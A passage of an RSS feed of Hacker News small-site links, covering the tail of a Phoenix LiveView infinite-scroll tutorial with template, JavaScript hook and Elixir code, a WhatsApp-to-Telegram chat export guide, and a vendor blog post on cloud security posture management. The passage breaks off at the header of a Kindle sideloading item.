<p>Here is first what the live view looks like, it’s pretty straightforward and does not change much from a normal list.</p>

<p><code>@records</code> here only contains the first page of records (so a maximum of 40 records in my case), this is used to display data when loading the page so that the user can interact directly with the list without waiting for the first page to load.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre></td><td><pre><span>&lt;div</span> <span>class=</span><span>"bg-white flex-1 h-100 lg:block x-space-y-2 overflow-auto relative h-full"</span>
         <span>id=</span><span>"scroll-</span><span>&lt;%=</span> <span>@wallet</span><span>.</span><span>id</span> <span>%&gt;</span><span>"</span>
         <span>phx-hook=</span><span>"InfiniteScroll"</span>
         <span>data-count=</span><span>"</span><span>&lt;%=</span> <span>@records_count</span> <span>%&gt;</span><span>"</span>
         <span>data-page-size=</span><span>"</span><span>&lt;%=</span> <span>@records_per_page</span> <span>%&gt;</span><span>"</span>
         <span>data-row-height=</span><span>"</span><span>&lt;%=</span> <span>@row_height</span> <span>%&gt;</span><span>"</span>
         <span>data-loading-block-id=</span><span>"loading-block"</span><span>&gt;</span>
        <span>&lt;%=</span> <span>for</span> <span>record</span> <span>&lt;-</span> <span>@records</span> <span>do</span> <span>%&gt;</span>
          <span>&lt;%=</span> <span>render</span><span>(</span><span>MavioWeb</span><span>.</span><span>LayoutView</span><span>,</span> <span>"record.html"</span><span>,</span>
               <span>conn:</span> <span>@socket</span><span>,</span>
               <span>record:</span> <span>record</span><span>,</span>
               <span>locale:</span> <span>@locale</span><span>,</span>
               <span>timezone:</span> <span>@timezone</span><span>,</span>
               <span>wallet:</span> <span>@wallet</span><span>,</span>
               <span>row_height:</span> <span>@row_height</span>
             <span>)</span> <span>%&gt;</span>
        <span>&lt;%</span> <span>end</span> <span>%&gt;</span>
    <span>&lt;/div&gt;</span>

    <span>&lt;!-- 
        here is the loading block, this is the block which is used when the data is still loading.
        This is the "pulse" animation you can see on the video when scrolling.
     --&gt;</span>
    <span>&lt;div</span> <span>id=</span><span>"loading-block"</span> <span>class=</span><span>"hidden"</span> <span>aria-hidden=</span><span>"true"</span><span>&gt;</span>
      <span>&lt;div</span> <span>class=</span><span>"animate-pulse rounded p-5 bg-white"</span> <span>style=</span><span>"height: </span><span>&lt;%=</span> <span>@row_height</span> <span>%&gt;</span><span>px"</span><span>&gt;</span>
           <span>&lt;div</span> <span>class=</span><span>"flex space-x-3"</span><span>&gt;</span>

              <span>&lt;svg</span> <span>xmlns=</span><span>"http://www.w3.org/2000/svg"</span> <span>viewBox=</span><span>"0 0 24 24"</span> <span>class=</span><span>"w-8 mr-2 icon-receipt"</span><span>&gt;&lt;path</span> <span>class=</span><span>"primary"</span> <span>d=</span><span>"M9 18.41l-2.3 2.3a1 1 0 0 1-1.4 0l-2-2A1 1 0 0 1 3 18V5c0-1.1.9-2 2-2h14a2 2 0 0 1 2 2v13a1 1 0 0 1-.3.7l-2 2a1 1 0 0 1-1.4 0L15 18.42l-2.3 2.3a1 1 0 0 1-1.4 0L9 18.4z"</span><span>&gt;&lt;/path&gt;&lt;path</span> <span>class=</span><span>"secondary"</span> <span>d=</span><span>"M7 7h10a1 1 0 0 1 0 2H7a1 1 0 1 1 0-2zm0 4h10a1 1 0 0 1 0 2H7a1 1 0 0 1 0-2z"</span><span>&gt;&lt;/path&gt;</span>
              <span>&lt;/svg&gt;</span>
              <span>&lt;div</span> <span>class=</span><span>"flex flex-col w-56"</span><span>&gt;</span>
                <span>&lt;div</span> <span>class=</span><span>"h-4 bg-blue-100 rounded mb-1"</span><span>&gt;&lt;/div&gt;</span>
                <span>&lt;div</span> <span>class=</span><span>"h-4 bg-blue-100 rounded w-5/6"</span><span>&gt;&lt;/div&gt;</span>
              <span>&lt;/div&gt;</span>
          <span>&lt;/div&gt;</span>
       <span>&lt;/div&gt;</span>
      <span>&lt;/div&gt;</span>
    <span>&lt;/div&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>As you can see, I’ve kept the live view as simple as possible, I’ve created a bunch of additional attributes that are used in the javascript:</p>

<ul>
  <li><code>data-count</code> contains the total number of items, this is helpfull for <em>fattable.js</em> to calculate the total height of the div.</li>
  <li><code>data-page-size</code> is the chunk size which we’re loading the items with, I’m setting it to 40 for my use case but it depends of what you are building, you might want a lower page size if retreiving the data is very expensive.</li>
  <li><code>data-row-height</code> is the row height in pixels. Unlike a traditional list, with this method, we need to have every row at the exact same height.</li>
  <li><code>data-loading-block-id</code> is an id linking to the HTML which is used when loading the data, it’s what’s using the “pulse” animation in the video.</li>
</ul>



<p>The main chunk of the code is in the new <a rel="nofollow noopener noreferrer" target="_blank" href="https://gist.github.com/alex-min/7c3f008f1614fc3448717b32e122bad7">InfiniteScroll Hook</a>, it handles the link between the fattable.js library and the Live View. I’ve commented every part to make it easier to follow:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
</pre></td><td><pre><span>require</span><span>(</span><span>'</span><span>fattable/fattable.js</span><span>'</span><span>);</span>


<span>/* 
 * This variable is used to keep the scroll position when the live view navigation changes.
 * This is useful for modals.
*/</span>
<span>let</span> <span>keepScroll</span> <span>=</span> <span>{};</span>

<span>export</span> <span>default</span> <span>{</span>
    <span>mounted</span><span>()</span> <span>{</span>
        <span>/*
         * Here we're loading the first page which is already rendered in the HTML 
         */</span>
        <span>var</span> <span>firstBlock</span> <span>=</span> <span>[];</span>
        <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>this</span><span>.</span><span>el</span><span>.</span><span>children</span><span>.</span><span>length</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
            <span>firstBlock</span><span>.</span><span>push</span><span>(</span><span>this</span><span>.</span><span>el</span><span>.</span><span>children</span><span>[</span><span>i</span><span>].</span><span>outerHTML</span><span>);</span>
        <span>}</span>

        <span>/* 
         *  All the attributes are mapped from what we sent in the live view 
         */</span>
        <span>const</span> <span>numberOfRows</span> <span>=</span> <span>parseInt</span><span>(</span><span>this</span><span>.</span><span>el</span><span>.</span><span>getAttribute</span><span>(</span><span>'</span><span>data-count</span><span>'</span><span>));</span>
        <span>const</span> <span>pageSize</span> <span>=</span> <span>parseInt</span><span>(</span><span>this</span><span>.</span><span>el</span><span>.</span><span>getAttribute</span><span>(</span><span>'</span><span>data-page-size</span><span>'</span><span>));</span>
        <span>const</span> <span>rowHeight</span> <span>=</span> <span>parseInt</span><span>(</span><span>this</span><span>.</span><span>el</span><span>.</span><span>getAttribute</span><span>(</span><span>'</span><span>data-row-height</span><span>'</span><span>));</span>
        <span>const</span> <span>loadingBlock</span> <span>=</span> <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>this</span><span>.</span><span>el</span><span>.</span><span>getAttribute</span><span>(</span><span>'</span><span>data-loading-block-id</span><span>'</span><span>)).</span><span>innerHTML</span><span>;</span>

        <span>let</span> <span>painter</span> <span>=</span> <span>new</span> <span>fattable</span><span>.</span><span>Painter</span><span>();</span>

        <span>painter</span><span>.</span><span>fillCell</span> <span>=</span> <span>(</span><span>cellDiv</span><span>,</span> <span>data</span><span>)</span> <span>=&gt;</span> <span>cellDiv</span><span>.</span><span>innerHTML</span> <span>=</span> <span>data</span><span>.</span><span>content</span><span>;</span>   <span>// filling the data when it's received</span>
        <span>painter</span><span>.</span><span>fillCellPending</span> <span>=</span> <span>(</span><span>cellDiv</span><span>)</span> <span>=&gt;</span> <span>cellDiv</span><span>.</span><span>innerHTML</span> <span>=</span> <span>loadingBlock</span><span>;</span>  <span>// the loading block when there's no data</span>

        <span>let</span> <span>tableModel</span> <span>=</span> <span>new</span> <span>fattable</span><span>.</span><span>PagedAsyncTableModel</span><span>();</span>

        <span>tableModel</span><span>.</span><span>cellPageName</span> <span>=</span> <span>(</span><span>i</span><span>)</span> <span>=&gt;</span> <span>(</span><span>i</span> <span>/</span> <span>pageSize</span><span>)</span> <span>|</span> <span>0</span><span>;</span>
        <span>tableModel</span><span>.</span><span>hasColumn</span> <span>=</span> <span>()</span> <span>=&gt;</span> <span>true</span><span>;</span>
        <span>tableModel</span><span>.</span><span>columnHeaders</span> <span>=</span> <span>[</span><span>"</span><span>Transaction</span><span>"</span><span>];</span> 
        <span>tableModel</span><span>.</span><span>getHeader</span> <span>=</span> <span>(</span><span>i</span><span>,</span> <span>cb</span><span>)</span> <span>=&gt;</span> <span>cb</span><span>(</span><span>tableModel</span><span>.</span><span>columnHeaders</span><span>[</span><span>i</span><span>]);</span>


        <span>/*
         * This is where we fetch the current page to render the header
         * We're using Live View events instead of HTTP requests since the socket is already opened
         * If it's the first page, we render the elements we gathered already from the server side rendering, no need to fetch them again
         */</span>
        <span>tableModel</span><span>.</span><span>fetchCellPage</span> <span>=</span> <span>(</span><span>offset</span><span>,</span> <span>cb</span><span>)</span> <span>=&gt;</span> <span>{</span>
            <span>if</span> <span>(</span><span>offset</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
                <span>cb</span><span>(</span><span>function</span> <span>(</span><span>i</span><span>)</span> <span>{</span>
                    <span>return</span> <span>{</span>
                        <span>rowId</span><span>:</span> <span>i</span><span>,</span>
                        <span>content</span><span>:</span> <span>firstBlock</span><span>[</span><span>i</span><span>]</span>
                    <span>}</span>
                <span>});</span>
            <span>}</span> <span>else</span> <span>{</span>
                <span>this</span><span>.</span><span>pushEventTo</span><span>(</span><span>`#</span><span>${</span><span>this</span><span>.</span><span>el</span><span>.</span><span>id</span><span>}</span><span>`</span><span>,</span> <span>"</span><span>load-table</span><span>"</span><span>,</span> <span>{</span> <span>offset</span><span>:</span> <span>offset</span> <span>});</span>
                <span>this</span><span>.</span><span>handleEvent</span><span>(</span><span>`</span><span>${</span><span>this</span><span>.</span><span>el</span><span>.</span><span>id</span><span>}</span><span>-receive-table-</span><span>${</span><span>offset</span><span>}</span><span>`</span><span>,</span> <span>payload</span> <span>=&gt;</span> <span>{</span>
                    <span>cb</span><span>(</span><span>function</span> <span>(</span><span>i</span><span>)</span> <span>{</span>
                        <span>return</span> <span>{</span>
                            <span>rowId</span><span>:</span> <span>i</span><span>,</span>
                            <span>content</span><span>:</span> <span>payload</span><span>.</span><span>html</span><span>[</span><span>i</span> <span>-</span> <span>payload</span><span>.</span><span>offset</span> <span>*</span> <span>pageSize</span><span>]</span>
                        <span>}</span>
                    <span>});</span>
                <span>});</span>
            <span>}</span>
        <span>}</span>

        <span>/* 
         * This is used to resize the list if the window size changes 
         */</span>
        <span>let</span> <span>getColumnWidth</span> <span>=</span> <span>()</span> <span>=&gt;</span> <span>{</span>
            <span>return</span> <span>[</span><span>this</span><span>.</span><span>el</span><span>.</span><span>getClientRects</span><span>()[</span><span>0</span><span>].</span><span>width</span><span>];</span>
        <span>}</span>

        <span>this</span><span>.</span><span>table</span> <span>=</span> <span>fattable</span><span>({</span>
            <span>container</span><span>:</span> <span>`#</span><span>${</span><span>this</span><span>.</span><span>el</span><span>.</span><span>id</span><span>}</span><span>`</span><span>,</span>
            <span>model</span><span>:</span> <span>tableModel</span><span>,</span>
            <span>nbRows</span><span>:</span> <span>numberOfRows</span><span>,</span>
            <span>rowHeight</span><span>,</span>
            <span>headerHeight</span><span>:</span> <span>0</span><span>,</span>
            <span>painter</span><span>,</span>
            <span>columnWidths</span><span>:</span> <span>getColumnWidth</span><span>()</span>
        <span>});</span>

        <span>window</span><span>.</span><span>addEventListener</span><span>(</span><span>'</span><span>resize</span><span>'</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>{</span>
            <span>this</span><span>.</span><span>table</span><span>.</span><span>columnWidths</span> <span>=</span> <span>getColumnWidth</span><span>()</span>
        <span>});</span>

        <span>/*
         * We set the scroll to where it was before, this object isn't stored in the localStorage,
         * this is by design, we want the list to be scrolled top when the user actually reloads the page, same as an actual list.
         */</span>
        <span>if</span> <span>(</span><span>keepScroll</span><span>[</span><span>this</span><span>.</span><span>el</span><span>.</span><span>id</span><span>])</span> <span>{</span>
            <span>this</span><span>.</span><span>table</span><span>.</span><span>scroll</span><span>.</span><span>setScrollXY</span><span>(</span><span>0</span><span>,</span> <span>keepScroll</span><span>[</span><span>this</span><span>.</span><span>el</span><span>.</span><span>id</span><span>]);</span>
        <span>}</span>
    <span>},</span>

    <span>/*
     * This will be called before the table is destroyed to save the scroll position, this is very useful for modals.
     */</span>
    <span>beforeDestroy</span><span>()</span> <span>{</span>
        <span>keepScroll</span><span>[</span><span>this</span><span>.</span><span>el</span><span>.</span><span>id</span><span>]</span> <span>=</span> <span>this</span><span>.</span><span>table</span><span>.</span><span>scroll</span><span>.</span><span>scrollTop</span><span>;</span>
    <span>}</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>And we load the hook in the LiveSocket, like any other Live View hook:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td><pre><span>import</span> <span>{</span> <span>LiveSocket</span> <span>}</span> <span>from</span> <span>"</span><span>phoenix_live_view</span><span>"</span><span>;</span>
<span>import</span> <span>InfiniteScroll</span> <span>from</span> <span>'</span><span>./hooks/InfiniteScroll</span><span>'</span><span>;</span>

<span>/* ... */</span>

<span>let</span> <span>csrfToken</span> <span>=</span> <span>document</span><span>.</span><span>querySelector</span><span>(</span><span>"</span><span>meta[name='csrf-token']</span><span>"</span><span>).</span><span>getAttribute</span><span>(</span><span>"</span><span>content</span><span>"</span><span>)</span>
<span>let</span> <span>liveSocket</span> <span>=</span> <span>new</span> <span>LiveSocket</span><span>(</span><span>"</span><span>/live</span><span>"</span><span>,</span> <span>Socket</span><span>,</span> <span>{</span>
    <span>hooks</span><span>:</span> <span>{</span>
        <span>InfiniteScroll</span>
    <span>},</span>
    <span>params</span><span>:</span> <span>{</span>
        <span>_csrf_token</span><span>:</span> <span>csrfToken</span><span>,</span>
    <span>}</span>
<span>});</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="the-elixir-side-of-things">The Elixir side of things</h2>

<p>Most of the code being on the hook, the Elixir side is very simple, we just listen to the hook event asking for data and we reply with what is needed.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td><pre>  <span>def</span> <span>handle_event</span><span>(</span>
        <span>"load-table"</span><span>,</span>
        <span>%{</span><span>"offset"</span> <span>=&gt;</span> <span>offset</span><span>},</span>
        <span>%{</span><span>assigns:</span> <span>%{</span><span>user:</span> <span>user</span><span>,</span> <span>wallet:</span> <span>wallet</span><span>,</span> <span>locale:</span> <span>locale</span><span>,</span> <span>timezone:</span> <span>timezone</span><span>}}</span> <span>=</span> <span>socket</span>
      <span>)</span> <span>do</span>
    <span>{</span><span>:noreply</span><span>,</span>
     <span>socket</span>
     <span>|&gt;</span> <span>push_event</span><span>(</span>
       <span>"scroll-</span><span>#{</span><span>wallet</span><span>.</span><span>id</span><span>}</span><span>-receive-table-</span><span>#{</span><span>offset</span><span>}</span><span>"</span><span>,</span>
       <span>%{</span>
         <span>offset:</span> <span>offset</span><span>,</span>
         <span>html:</span>
           <span>list_records_from_wallet</span><span>(</span>
             <span>user:</span> <span>user</span><span>,</span>
             <span>wallet_id:</span> <span>wallet</span><span>.</span><span>id</span><span>,</span>
             <span>page:</span> <span>offset</span> <span>+</span> <span>1</span><span>,</span>
             <span>per_page:</span> <span>@records_per_page</span>
           <span>)</span>
           <span>|&gt;</span> <span>Enum</span><span>.</span><span>map</span><span>(</span><span>fn</span> <span>record</span> <span>-&gt;</span>
             <span>render_to_string</span><span>(</span><span>MavioWeb</span><span>.</span><span>LayoutView</span><span>,</span> <span>"record.html"</span><span>,</span>
               <span>conn:</span> <span>socket</span><span>,</span>
               <span>record:</span> <span>record</span><span>,</span>
               <span>locale:</span> <span>locale</span><span>,</span>
               <span>timezone:</span> <span>timezone</span><span>,</span>
               <span>wallet:</span> <span>wallet</span><span>,</span>
               <span>row_height:</span> <span>@row_height</span>
    …</pre></td></tr></tbody></table></code></pre></div></div></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://alex-min.fr/phoenix-live-view-very-large-list-hook/">https://alex-min.fr/phoenix-live-view-very-large-list-hook/</a></em></p>]]>
            </description>
            <link>https://alex-min.fr/phoenix-live-view-very-large-list-hook/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25715878</guid>
            <pubDate>Sun, 10 Jan 2021 15:54:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Transfer a Chat from WhatsApp to Telegram]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25715852">thread link</a>) | @maydemir
<br/>
January 10, 2021 | https://www.selectallfromdual.com/blog/en/33943/transfer-a-chat-from-whatsapp-to-telegram | <a href="https://web.archive.org/web/*/https://www.selectallfromdual.com/blog/en/33943/transfer-a-chat-from-whatsapp-to-telegram">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-33943">
<!-- .entry-header -->
<div>
<h2>How to migrate a conversation from WhatsApp to Telegram</h2>
<div><figure><img loading="lazy" width="640" height="426" src="https://www.selectallfromdual.com/blog/wp-content/uploads/2015/07/sostituisco-ben-volentieri-whatsapp-con-telegram.jpg" alt=""></figure></div>
<p>We said that we never talked about the Telegram, and personally, I stopped with this, my personal battle against WhatsApp. So in the end, who wants to use WhatsApp will continue to do so, and those who want to switch to Telegram it will be the only. In the end everyone uses the app that it deserves.</p>
<p>This article here, however, I want to dedicate to all those in the Telegram we want to go, but don’t do it to not lose all of their previous chats. In fact, just inviting the migration if on the other app you have so many important conversations that you do not want to miss. But there is a solution.</p>
<p>In fact, there is the possibility to export the chat from WhatsApp, send it to a contact on Telegram while keeping all the messages and all the media (photos, videos, voice messages, attachments). The operation is not even complicated.</p>
<h3>We migrate from WhatsApp to Telegram</h3>
<p>To migrate, simply <strong>open WhatsApp and the chat</strong> that we want to move on Telegram, click on <strong>menu</strong> and use the <strong>Export command chat</strong></p>
<div><figure><img loading="lazy" width="374" height="810" src="https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-1.jpg" alt="" srcset="https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-1.jpg 374w, https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-1-139x300.jpg 139w" sizes="(max-width: 374px) 100vw, 374px"></figure></div>
<p>you will be asked if you also include all the files of the conversation, we want to migrate everything, so we’re going to <strong>Include the media</strong></p>
<div><figure><img loading="lazy" width="374" height="810" src="https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-2.jpg" alt="" srcset="https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-2.jpg 374w, https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-2-139x300.jpg 139w" sizes="(max-width: 374px) 100vw, 374px"></figure></div>
<p>you will be asked for the destination where you want the chat to be exported, we choose <strong>Telegram</strong></p>
<div><figure><img loading="lazy" width="374" height="810" src="https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-3.jpg" alt="" srcset="https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-3.jpg 374w, https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-3-139x300.jpg 139w" sizes="(max-width: 374px) 100vw, 374px"></figure></div>
<p>as a final stage, you will be asked for the contact to which you want to send the chat exported, then select the <strong>contact</strong>, click on <strong>send</strong>, and the process will be to attach all of the chat in a file with format .txt, and in orderly sequence all the files and all the voice were exchanged between the two contacts.</p>
<figure><ul><li><figure><img loading="lazy" width="374" height="810" src="https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-4.jpg" alt="" data-id="6573" data-full-url="https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-4.jpg" data-link="https://www.selectallfromdual.com/blog/?attachment_id=6573" srcset="https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-4.jpg 374w, https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-4-139x300.jpg 139w" sizes="(max-width: 374px) 100vw, 374px"></figure></li><li><figure><img loading="lazy" width="374" height="810" src="https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-5.jpg" alt="" data-id="6574" data-full-url="https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-5.jpg" data-link="https://www.selectallfromdual.com/blog/?attachment_id=6574" srcset="https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-5.jpg 374w, https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-5-139x300.jpg 139w" sizes="(max-width: 374px) 100vw, 374px"></figure></li><li><figure><img loading="lazy" width="374" height="810" src="https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-6.jpg" alt="" data-id="6575" data-full-url="https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-6.jpg" data-link="https://www.selectallfromdual.com/blog/?attachment_id=6575" srcset="https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-6.jpg 374w, https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-6-139x300.jpg 139w" sizes="(max-width: 374px) 100vw, 374px"></figure></li></ul></figure>
<p>this is the example of the display of the chat is saved in the file .txt</p>
<div><figure><img loading="lazy" width="374" height="250" src="https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-7_2.jpg" alt="" srcset="https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-7_2.jpg 374w, https://www.selectallfromdual.com/blog/wp-content/uploads/2020/02/migrazione-whatsapp-telegram-7_2-300x201.jpg 300w" sizes="(max-width: 374px) 100vw, 374px"></figure></div>
<p>the new chat on Telegram will be presented in a way that is somewhat unusual, because the entire written part is inserted into a single file, but it’s still a very efficient system to be able to switch their conversations on Telegram without losing the historical.</p>
<p>In addition, we end up with a couple of useful references to those who Telegram the usa already, both to those who have not yet ever used</p>
<h3>References</h3>
<ul><li><strong><a href="https://insidetelegram.eu/" target="_blank" rel="noreferrer noopener">InsideTelegram</a></strong> – Support and guide to use Telegram to the better</li><li><strong><a href="https://insidebind.eu/" target="_blank" rel="noreferrer noopener">InsideBind</a></strong> – Store channels, groups and bots</li></ul>

<!-- INIZIO MODIFICA FRANCESCO - CODICE PER AVVISO LINK CORROTTI -->
<p>We randomly check the functioning of the links in our articles. If you notice any links that do not work, please let us know in the comments. <b>If you enjoyed the article consider supporting the blog with a small donation. Thank you.</b></p>

<!-- INIZIO MODIFICA FRANCESCO -  CODICE PER AVVISO LINK CORROTTI -->
</div><!-- .entry-content -->
<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://www.selectallfromdual.com/blog/en/33943/transfer-a-chat-from-whatsapp-to-telegram</link>
            <guid isPermaLink="false">hacker-news-small-sites-25715852</guid>
            <pubDate>Sun, 10 Jan 2021 15:50:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Automatically Generating Algorithmic Art]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25715850">thread link</a>) | @coolvision
<br/>
January 10, 2021 | https://grgv.xyz/creative_code_synthesis/ | <a href="https://web.archive.org/web/*/https://grgv.xyz/creative_code_synthesis/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://grgv.xyz/creative_code_synthesis/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25715850</guid>
            <pubDate>Sun, 10 Jan 2021 15:50:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Best Practices for Cloud Security Posture Management]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25715815">thread link</a>) | @cobano
<br/>
January 10, 2021 | http://www.xmcyber.com/best-practices-for-cloud-security-posture-management/ | <a href="https://web.archive.org/web/*/http://www.xmcyber.com/best-practices-for-cloud-security-posture-management/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Cloud services are booming and adoption continues unabated. That’s a good thing, given that the efficiencies that are attached to cloud computing can unlock value and scalability and make organizations more competitive.</p>
<p>There is one significant caveat, however: All of this growth and adoption has created extraordinary complexity and increased risk. Many infrastructure providers offer risk assessment and configuration capabilities, but these typically only cover their own services. Organizations with hybrid or multi-cloud setups may have a lot of unprotected (or sub-optimally protected) networks and systems. Additionally, their security teams may lack the necessary expertise to handle this ever-expanding web of complexity, creating an even greater need for automated tools that can help close the gap.</p>
<p>With that in mind, let’s take a closer look at some best practices you can adopt for better <a href="https://www.xmcyber.com/xm-cyber-for-cloud-security-posture-management/">cloud security management</a>.</p>
<h2><strong>How to&nbsp;Improve Your&nbsp;Cloud Security Posture</strong></h2>
<p>The rise of cloud computing has forced today’s defenders to rethink how they approach their security posture. What may have worked historically may no longer be effective in the context of distributed architecture and hybrid setups.</p>
<p>As mentioned above, however, many teams lack the requisite expertise to navigate the full range of infrastructure management services, cloud security tools, and all of the nuances that exist within these categories. The security risks of cloud environments can be considerable given the amount of complexity involved.</p>
<p>This makes reliance on the right set of software solutions even more important. One of the most relevant security tool categories for this task that we have today is CSPM — or&nbsp;<a href="https://www.xmcyber.com/what-is-cloud-security-posture-management/">Cloud&nbsp;Security Posture Management</a>.</p>
<h2><strong>What is CSPM</strong><strong>?</strong></h2>
<p>Cloud&nbsp;Security Posture Management&nbsp;solutions are designed to automatically assess the security of cloud environments. These assessments are made by comparing the existing state of security against best practices and uncovering any security violations. Should violations be found, they can then be remediated. All of this is done via automation, which helps lessen the need for institutional skill and expertise among organizational teams. Because almost all successful attacks on cloud environments are the result of misconfigurations, the ability to verify that configurations are following best practices is an imperative.</p>
<p>Now that we’ve answered the question “what is&nbsp;cloud&nbsp;security posture management,” let’s take a closer look at how software tools in this category work.</p>
<h3><strong>How a Typical CSPM Works</strong></h3>
<p>If you’re curious how CSPMs operate, here is a typical example:</p>
<ul>
<li>A CSPM will identify footprints and search for any shadow IT concerns (new buckets/instances).</li>
<li>It will scan buckets and instances for misconfigurations and/or improper settings that could leave cloud environments a sitting duck for attackers.</li>
<li>A CSPM will also help ensure policy visibility and enforcement across all cloud providers, regardless of the number.</li>
<li>It can audit to ensure that compliance mandates are being met.</li>
<li>Verification that operational activities are occurring normally is also a function of most CSPMs.</li>
<li>Risk assessment or troubleshooting against external frameworks (such as MITRE ATT*CK or the International Organization for Standardization) can also be carried out.</li>
</ul>
<h3><strong>Actionable Steps for Better&nbsp;Cloud Security Posture</strong></h3>
<p>Now that we’ve detailed how CSPM solutions work, let’s review some steps you can take right now to enhance your&nbsp;cloud&nbsp;security posture management.</p>
<p>First, you should use a tool that allows you to continually evaluate your security posture against known best practices. The right solution can also help ensure you remain in compliance against multiple frameworks simultaneously.</p>
<p>Next, any tool should be powerful enough to allow real-time visibility across all environments, cloud and otherwise. Maintaining visibility across multiple environments is critically important, given the ever-growing and changing nature of cloud computing. One seemingly small change can create a vulnerability that leads to devastating financial and reputational consequences.</p>
<h3><strong>How XM Cyber Can Help</strong></h3>
<p>XM Cyber’s Attack-Centric Exposure Prioritization solution can play a critical role in cloud security posture management. By launching simulated attacks on security environments that are continuous and automated, our Risk-Based Vulnerability Management (RBVM) technology offers comprehensive protection against configuration errors and other security problems tied to the growing adoption and complexity of the cloud.</p>
<p>XM Cyber constantly simulates and prioritizes the attack paths putting mission-critical systems at risk, providing context-sensitive remediation options. <a href="https://www.xmcyber.com/xm-cyber-platform/">Our platform</a> helps to eliminate 99% of the risk by focusing allowing IT and Security Operations to focus on the 1% of the exposures before they get exploited to breach the organization’s “crown jewels” – its critical assets.</p>
<p>XM Cyber was the first to offer protection in hybrid environments, making it ideally suited for cloud security posture management improvement. If you would like more information about how our products can help, please click <a href="https://www.xmcyber.com/">here.</a></p>
<p><em><strong>Shahar Solomon is Customer Operations Manager, XM Cyber</strong></em></p>
</div></div>]]>
            </description>
            <link>http://www.xmcyber.com/best-practices-for-cloud-security-posture-management/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25715815</guid>
            <pubDate>Sun, 10 Jan 2021 15:47:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sideloading Books on Kindle with Goodreads Integration]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25715769">thread link</a>) | @iamacyborg
<br/>
January 10, 2021 | https://www.jacquescorbytuech.com/writing/sideloading-books-kindle-goodreads-integration | <a href="https://web.archive.org/web/*/https://www.jacquescorbytuech.com/writing/sideloading-books-kindle-goodreads-integration">archive.org</a>
